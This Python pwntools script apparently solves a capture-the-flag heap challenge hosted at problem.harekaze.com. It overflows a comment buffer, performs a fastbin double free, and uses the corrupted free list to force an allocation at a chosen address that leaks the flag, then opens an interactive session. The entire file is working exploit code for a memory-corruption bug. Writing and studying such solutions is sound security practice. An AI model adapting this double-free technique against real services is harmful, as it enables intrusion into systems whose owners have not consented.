import struct

from pwn import *


def to_num(addr):
    return struct.unpack('Q', addr)[0]


def to_addr(num):
    return struct.pack('Q', num)


def comment(pc, com):
    pc.recvuntil('note:')
    pc.sendline(com)


def add(pc, size, name, fl=False, print_flag=False):
    pc.recvuntil('> ')
    pc.sendline('1')
    pc.recvuntil('Size: ')
    pc.sendline(size)
    pc.recvuntil('Name: ')
    pc.sendline(name)
    if not fl:
        pc.recvline()
    name = pc.recvline()[6:-1]
    resp = pc.recvline()
    if print_flag:
        print(resp)
    addr = pc.recvline()[6:-1]
    return name, addr


def delete(pc, addr):
    pc.recvuntil('> ')
    pc.sendline('2')
    pc.recvuntil('Addr: ')
    pc.sendline(addr)
    pc.recvuntil('3. Exit')
    pc.recvuntil('3. Exit')


def main():
    flag = '\x56\x40\x20\x00\x00\x00\x00\x00'

    pc = remote('problem.harekaze.com', 20175)

    comment(pc, 'A' * 94 + '\x41\x00')
    name1, addr1 = add(pc, '45', 'AAAA')
    name2, addr2 = add(pc, '45', 'BBBB')
    name3, addr3 = add(pc, '45', 'CCCC')

    delete(pc, addr1)
    delete(pc, addr2)
    delete(pc, addr1)

    name4, addr4 = add(pc, '45', flag, True)
    name5, addr5 = add(pc, '45', '', True)
    name6, addr6 = add(pc, '45', flag, True)

    print(addr4)  # check if double free works
    print(addr6)

    delete(pc, addr4)

    name7, addr7 = add(pc, '45', '')
    name8, addr8 = add(pc, '45', 'AAAAAAAAAAAAAAAAAAAAAAAAA', print_flag=True)

    pc.interactive()


if __name__ == '__main__':
    main()